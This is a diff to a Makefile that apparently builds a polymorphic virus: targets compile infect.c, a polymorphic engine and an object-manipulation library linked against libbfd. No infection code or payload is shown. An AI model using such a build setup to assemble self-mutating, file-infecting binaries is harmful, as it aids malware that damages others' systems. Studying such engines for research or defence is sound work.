@@ -41,13 +41,12 @@ AFLAGS = -felf64 -g -F dwarf
 CFLAGS = -c  -Wall -O2 -g
 
 LFLAGS = -no-pie 
-KFLAGS = -no-pie -nostartfiles -m64 -g -falign-functions=16
-all: virus polymake
-
+KFLAGS = -no-pie -nostartfiles -m64 -g -falign-functions=16 -L./lib
+all: virus polymake solopoly
 polymake: polyengine.o polymorphicengine.o
 	$(GCC) $(LFLAGS) $^ -o $@
 	
-virus:  infect.c polymorphic.c virus.o 
+virus:  infect.c polymorphicengine.o polymorphic.c libobjdata.a virus.o -lobjdata -lbfd 
 	$(CC) $(KFLAGS) $^ -o $@
 
 virus.o: virus.asm template.asm.inc
@@ -59,9 +58,16 @@ polyengine.o: polymake.cpp
 polymorphicengine.o: polymorphicengine.asm
 	$(ASM) $(AFLAGS) $< -o $@
 
+libobjdata.a: objsect.o objsym.o objcopy.o
+	ar rs libobjdata.a objsect.o objsym.o objcopy.o
+	mkdir -p lib
+	cp -f libobjdata.a lib
 
 
-
+XFLAGS = -no-pie  -L./lib
+solopoly: polymorphic2.c polymorphicengine.o libobjdata.a -lobjdata -lbfd
+	$(CC) $(LFLAGS) $^ -o $@
+	
 
 
 # # deploy level extreme deployment - this strips out all kind of information using the switch `-s` for gcc
